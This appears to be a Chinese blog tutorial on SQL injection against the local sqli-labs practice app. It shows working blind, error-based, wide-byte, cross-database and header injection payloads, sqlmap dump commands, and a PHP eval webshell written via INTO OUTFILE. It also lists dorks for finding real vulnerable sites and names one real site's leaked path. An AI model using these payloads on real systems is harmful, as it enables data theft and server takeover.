<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入</span><br><span class="line">首先要查询当前数据库的长度，在布尔注入中要用and来连接</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+</span><br><span class="line">我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。</span><br><span class="line">我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905634367.png" alt="1583905634367"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905687105.png" alt="1583905687105"></p>
<p>知道数据库的长度了我们就要注入出数据库的名称，因为盲注不适用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+</span><br><span class="line"></span><br><span class="line">我们这两将GET请求发送到 intruder模块下</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906874787.png" alt="1583906874787"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现将1的位置clear$掉，然后选中101进行Add$</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906926421.png" alt="1583906926421"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在intruder下的payloads在payload type选择Numbers</span><br><span class="line">起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906434633.png" alt="1583906434633"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907052698.png" alt="1583907043000"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907307105.png" alt="1583907052698"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们已经知道他的库名是security，我们要查询表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">然后继续抓包进行自动扫描</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908711931.png" alt="1583907307105"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表</span><br><span class="line">说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907737457.png" alt="1583907737457"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询出了表我们查询字段，查看users的字段</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908847437.png" alt="1583908711931"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出</span><br><span class="line">id，username，password字段</span><br><span class="line"></span><br><span class="line">查询字段数据和union一样将from后的删掉加上该加的然后查询表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line"></span><br><span class="line">还有个时间注入效率非常慢，能不用时间注入就不用,</span><br><span class="line">这里演示的是查询他的库名，表名和字段名跟union一样</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917097717.png" alt="1583908847437"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>什么时候需要报错注入</p>
<p>在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入</p>
<p>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1 正常进行绕过，但是在Less-5没有数据回显，断定为报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、updatexml</span><br><span class="line">0x7e编码是~的解码形式，可以理解为，让后台xml故意报错</span><br><span class="line">concat就是排序</span><br><span class="line">这是查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">进一步获取表名，列名，数据。。。</span><br><span class="line">在报错注入的情况下不能使用union select，只能使用select来查询语句</span><br><span class="line"> </span><br><span class="line">之前用union获取表名</span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schem&#x3D;&#39;security&#39;</span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">and undatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;seurity&#39; limit 0,1),0x7e),1)</span><br><span class="line">因为使用了limit如果数据库内容少的话可以手动一个一个加，但是如果数据库有几百条的话，就不能手动加了，效率太慢，可以使用burp，抓包发送的intruder模块然后$clear清除，将limit第一个值$add一下，选择Payload模块里面的Number设置值，进行攻击</span><br><span class="line"></span><br><span class="line">2、extractvalue</span><br><span class="line">对数据库让他进行一个xml文档的故意报错</span><br><span class="line">利用这种方式面对后台进行一个排序，指定第一个参数为null，让他故意报错，将第二个参数的语句带入数据库执行</span><br><span class="line">and extractvalue(null,concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148581365.png" alt="1583917097717"></p>
<h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>很多情况下，网站管理员会对传进的参数进行一个加密的操作，加密很可能自己写，也有可能base64，md5等，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在百度搜索以下代码之后会出现一些网址，随便进一个就行</span><br><span class="line">inurl:Mw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">划横线的地方就是典型的base64编码，我们将这一小段代码复制，然后用转换公爵转换一下</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149885333.png" alt="1584148581365"></p>
<h4 id="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"><a href="#发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果" class="headerlink" title="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"></a>发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148714349.png" alt="1584148714349"></p>
<h5 id="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存"><a href="#这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存" class="headerlink" title="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存"></a>这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149801524.png" alt="1584149801524"></p>
<h5 id="打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"><a href="#打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码" class="headerlink" title="打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"></a>打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584150737096.png" alt="1584149885333"></p>
<h5 id="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"><a href="#这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出" class="headerlink" title="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"></a>这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983173037.png" alt="1584150737096"></p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在很多情况下，’为了安全经常会替换成/‘符号进入后台</p>
<p>当输入id=1’加上单引号的时候会爆出一个反斜杠的错误，这样，我们传入的单引号被转义了，无法逃逸单引号的包围，一般情况下是不存在SQL注入漏洞的，不过有一个特例就是当数据库的编码为GBK编码时，可以使用宽字节注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583918413567.png" alt="1583917392652"></p>
<p>%df是β的URL编码</p>
<p>宽字节的格式是在地址后面加一个<strong>%df</strong>再加<strong>单引号</strong>，因为反斜杠的编码是<strong>%5c</strong>而在GBK中%df%5c是繁体字連，所以这个时候单引号成功逃逸，报出mysql 的错误</p>
<p>之后的查询跟union一样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里查看的是表名，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583982481280.png" alt="1583918413567"></p>
<h3 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h3><p>如果要应用跨库注入，有<strong>一个条件</strong>，那就是当前数据库用户为<strong>root用户</strong>，才可以<strong>对整个数据库进行操作</strong></p>
<h5 id="确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户"><a href="#确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户" class="headerlink" title="确定用户：user()    确定用户    如果回显root@localhost或者root@127.0.0.1只要@前面是root那就是root用户"></a>确定用户：user()    确定用户    如果回显root@localhost或者<a href="mailto:root@127.0.0.1">root@127.0.0.1</a>只要@前面是root那就是root用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">跟union查询一样，先获取字段，然后再返回数字位置查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,user()--+ </span><br><span class="line">因为@前是root，所以我们可以进行一个跨库注入</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983833758.png" alt="1583982481280"></p>
<h4 id="获取数据库过程："><a href="#获取数据库过程：" class="headerlink" title="获取数据库过程："></a>获取数据库过程：</h4><h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><h5 id="获取当前所有数据库"><a href="#获取当前所有数据库" class="headerlink" title="获取当前所有数据库"></a>获取当前所有数据库</h5><h5 id="存有所有数据库的表名为：-information-schema-schemata-存储所有数据库"><a href="#存有所有数据库的表名为：-information-schema-schemata-存储所有数据库" class="headerlink" title="存有所有数据库的表名为：    information_schema.schemata    存储所有数据库"></a>存有所有数据库的表名为：    information_schema.schemata    存储所有数据库</h5><h5 id="schema-name-获取数据库名"><a href="#schema-name-获取数据库名" class="headerlink" title="schema_name        获取数据库名"></a>schema_name        获取数据库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985321796.png" alt="1583983173037"></p>
<h5 id="这里我们获取myemployees库里的表"><a href="#这里我们获取myemployees库里的表" class="headerlink" title="这里我们获取myemployees库里的表"></a>这里我们获取myemployees库里的表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583998370760.png" alt="1583983833758"></p>
<h5 id="获取当前字段"><a href="#获取当前字段" class="headerlink" title="获取当前字段"></a>获取当前字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;employees&#39; and table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985119530.png" alt="1583985119530"></p>
<h5 id="获取department表的数据"><a href="#获取department表的数据" class="headerlink" title="获取department表的数据"></a>获取department表的数据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(location_id) from myemployees.departments--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062638658.png" alt="1583985321796"></p>
<p>跨库注入和普通注入的区别</p>
<p>跨库注入首先要获取所有数据库名称</p>
<p>在查询表名，字段名，必须限定你的要注入的数据库名称</p>
<h4 id="mysql高权限用户注入"><a href="#mysql高权限用户注入" class="headerlink" title="mysql高权限用户注入"></a>mysql高权限用户注入</h4><p>getshell</p>
<h5 id="mysql注入高权限文件操作"><a href="#mysql注入高权限文件操作" class="headerlink" title="mysql注入高权限文件操作"></a>mysql注入高权限文件操作</h5><h5 id="目的：发现了注入点，还想进一步渗透，写入文件来getshell"><a href="#目的：发现了注入点，还想进一步渗透，写入文件来getshell" class="headerlink" title="目的：发现了注入点，还想进一步渗透，写入文件来getshell"></a>目的：发现了注入点，还想进一步渗透，写入文件来getshell</h5><p>写入PHP EVAL 一句话木马</p>
<?php eval($_POST["pass"])?>

<p>写入php一句木马有一个前提：我们的木马必须被mysql允许上传，设置secure_file_priv=为空</p>
<p>secure_file_priv 是可以绕过的(通过mysql的日态文件来进行绕过，有一个前提，网站必须开启这个日态功能，如果没有开启，就不许有一个执行sql语句的地方)</p>
<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><h5 id="sql-labs第七关-文件写入"><a href="#sql-labs第七关-文件写入" class="headerlink" title="sql labs第七关 文件写入"></a>sql labs第七关 文件写入</h5><h5 id="sql语句绕过分析"><a href="#sql语句绕过分析" class="headerlink" title="sql语句绕过分析"></a>sql语句绕过分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将引号里的id删除</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; $id &#39; ) )</span><br><span class="line"></span><br><span class="line">加上 &#39;))--+</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; &#39;))--+ &#39; ) )</span><br></pre></td></tr></table></figure>

<h5 id="在sqli-labs里面尝试写入"><a href="#在sqli-labs里面尝试写入" class="headerlink" title="在sqli labs里面尝试写入"></a>在sqli labs里面尝试写入</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;&#39;))union 1,2,3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062306167.png" alt="1583998370760"></p>
<p>这里并没有响应，文件写入注入点，一定没有反应</p>
<p>文件写入语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>

<p>在这个<strong>2</strong>中使用<strong>单引号</strong>写入你想写入的东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们直接使用一句话木马进行上传,这里最后是路径，路径必须存才否则报错，这里必须用双斜杠，因为单斜杠会被转义</span><br><span class="line">union select 1,&#39;&lt;?php eval($_POST[&quot;pass&quot;])?&gt;&#39;,3 into outfile &#39;D:\\1\\1.php&#39;</span><br></pre></td></tr></table></figure>

<h5 id="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"><a href="#在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。" class="headerlink" title="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"></a>在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。</h5><h5 id="1、通过错误爆出路径"><a href="#1、通过错误爆出路径" class="headerlink" title="1、通过错误爆出路径"></a>1、通过错误爆出路径</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这两个命令可以再百度查看一些错误网页信息</span><br><span class="line">inurl:php warning</span><br><span class="line">inurl:edu.cn warning</span><br></pre></td></tr></table></figure>

<p>网站                                                                        错误信息</p>
<p><a href="http://www.doushanedu.cn/" target="_blank" rel="noopener">www.doushanedu.cn/</a>             /www/wwwroot/zhanqun/data/function.php</p>
<h5 id="2、通过对方网站遗留文件爆出路径"><a href="#2、通过对方网站遗留文件爆出路径" class="headerlink" title="2、通过对方网站遗留文件爆出路径"></a>2、通过对方网站遗留文件爆出路径</h5><p>常见的遗留的phpinfor.php文件</p>
<h5 id="3、通过漏洞爆出路径"><a href="#3、通过漏洞爆出路径" class="headerlink" title="3、通过漏洞爆出路径"></a>3、通过漏洞爆出路径</h5><p>discuz爆出路径</p>
<h5 id="4、根据对方web服务器类型猜解路径"><a href="#4、根据对方web服务器类型猜解路径" class="headerlink" title="4、根据对方web服务器类型猜解路径"></a>4、根据对方web服务器类型猜解路径</h5><p>IIS:\inetpub\wwwroot\</p>
<p>PHPSTUDY2020:\phpstudy pro\www</p>
<p>PHPSTUDY2018:\phpStudy\PHPTutorial\WWW</p>
<p>只要爆出来路径，并且secure_file_priv为空，即可写入文件getshell</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><h5 id="爆出库名"><a href="#爆出库名" class="headerlink" title="爆出库名"></a>爆出库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062379253.png" alt="1584062306167"></p>
<h5 id="爆出想要查询数据库的表名，这里查询security"><a href="#爆出想要查询数据库的表名，这里查询security" class="headerlink" title="爆出想要查询数据库的表名，这里查询security"></a>爆出想要查询数据库的表名，这里查询security</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062748704.png" alt="1584062379253"></p>
<h5 id="爆出字段，这里查询users表"><a href="#爆出字段，这里查询users表" class="headerlink" title="爆出字段，这里查询users表"></a>爆出字段，这里查询users表</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062849649.png" alt="1584062638658"></p>
<h5 id="爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库"><a href="#爆出数据，这里查询password，username，这里使用–dump-荡出整个数据库" class="headerlink" title="爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库"></a>爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062904145.png" alt="1584062748704"></p>
<h5 id="还可以使用sqlmap查看当前用户"><a href="#还可以使用sqlmap查看当前用户" class="headerlink" title="还可以使用sqlmap查看当前用户"></a>还可以使用sqlmap查看当前用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --users</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062987595.png" alt="1584062849649"></p>
<h5 id="如果用户为root用户可以查询数据库密码"><a href="#如果用户为root用户可以查询数据库密码" class="headerlink" title="如果用户为root用户可以查询数据库密码"></a>如果用户为root用户可以查询数据库密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --password</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068754403.png" alt="1584062904145"></p>
<h5 id="爆出以上加密密码，使用md5在线解密，查看密码"><a href="#爆出以上加密密码，使用md5在线解密，查看密码" class="headerlink" title="爆出以上加密密码，使用md5在线解密，查看密码"></a>爆出以上加密密码，使用md5在线解密，查看密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">查看这个解密之后的值，可以看到，当前数据库密码为root</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069595543.png" alt="1584062987595"></p>
<h5 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917392652.png" alt="1584063112661"></p>
<h4 id="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"><a href="#注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”" class="headerlink" title="注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”"></a>注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”</h4><h4 id="之前都是以GET请求注入，我们现在要以多种请求注入"><a href="#之前都是以GET请求注入，我们现在要以多种请求注入" class="headerlink" title="之前都是以GET请求注入，我们现在要以多种请求注入"></a>之前都是以GET请求注入，我们现在要以多种请求注入</h4><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h5><h5 id="GET-最常见的请求方式"><a href="#GET-最常见的请求方式" class="headerlink" title="GET    最常见的请求方式"></a>GET    最常见的请求方式</h5><h5 id="POST-一般用于登录框"><a href="#POST-一般用于登录框" class="headerlink" title="POST     一般用于登录框"></a>POST     一般用于登录框</h5><h5 id="COOKIE-想用哪里用哪里"><a href="#COOKIE-想用哪里用哪里" class="headerlink" title="COOKIE    想用哪里用哪里"></a>COOKIE    想用哪里用哪里</h5><h4 id="POST请求注入"><a href="#POST请求注入" class="headerlink" title="POST请求注入"></a>POST请求注入</h4><p>确定字段数</p>
<h5 id="只需要在登录框提交sql注入语句"><a href="#只需要在登录框提交sql注入语句" class="headerlink" title="只需要在登录框提交sql注入语句"></a>只需要在登录框提交sql注入语句</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里测试了，他的字段数是2</span><br><span class="line">例如：</span><br><span class="line">-1&#39; order by 2</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584068845245.png" alt="1584068754403"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库</span><br><span class="line">-1&#39; union select 1,database() #</span><br><span class="line"></span><br><span class="line">后面查询跟Union相同</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069834914.png" alt="1584068845245"></p>
<h4 id="COOKIE请求注入"><a href="#COOKIE请求注入" class="headerlink" title="COOKIE请求注入"></a>COOKIE请求注入</h4><h5 id="如果获取到cookie呢？"><a href="#如果获取到cookie呢？" class="headerlink" title="如果获取到cookie呢？"></a>如果获取到cookie呢？</h5><p>可以使用burp抓包，然后在cookie后写入sql注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里用-1&#39; order by 3 # 查看字段是是否是3，发现页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069642030.png" alt="1584069595543"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069770460.png" alt="1584069642030"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看-1&#39; order by 4 # 字段4是否是正常，页面返回错误，我们可以确定字段是3</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584078476353.png" alt="1584069691296"></p>
<h5 id="查看当前库名"><a href="#查看当前库名" class="headerlink" title="查看当前库名"></a>查看当前库名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,database()# 查看当前库名，如果要查询表名和字段名数据，和union注入相同</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584183906874.png" alt="1584069834914"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584080162515.png" alt="1584069770460"></p>
<h4 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h4><p>如果user-Agent这里，如果添加一个sql查询，就可以通过user-Agent进行sql注入</p>
<h4 id="参数类型注入-三种"><a href="#参数类型注入-三种" class="headerlink" title="参数类型注入(三种)"></a>参数类型注入(三种)</h4><h5 id="1、数字型"><a href="#1、数字型" class="headerlink" title="1、数字型"></a>1、数字型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;1</span><br><span class="line"></span><br><span class="line">连接后就构造成了sql语句的查询</span><br><span class="line">连接：select * from mars where id&#x3D;-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：-1 union select 1,database(),user()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584069691296.png" alt="1584078476353"></p>
<h5 id="2、字符型"><a href="#2、字符型" class="headerlink" title="2、字符型"></a>2、字符型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where id&#x3D;&#39;mars&#39;</span><br><span class="line"></span><br><span class="line">连接：select * from mars where id&#x3D;&#39;-1’ union select 1,database(),user()--+&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ID：-1’ union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584184821104.png" alt="1584078842647"></p>
<h5 id="3、搜索型"><a href="#3、搜索型" class="headerlink" title="3、搜索型"></a>3、搜索型</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语句：select * from mars where mars like id&#x3D;&#39;%a%&#39;</span><br><span class="line"></span><br><span class="line">%&#39;闭合前面，后面虽然也可以用注释符注释掉但不推荐 还是用&#39;%来将其闭合，中间剩下的就是sql注入语句</span><br><span class="line">连接：select * from mars where mars like id&#x3D;&#39;%%&#39; union select 1,database(),user()&#39;%%&#39;</span><br></pre></td></tr></table></figure>

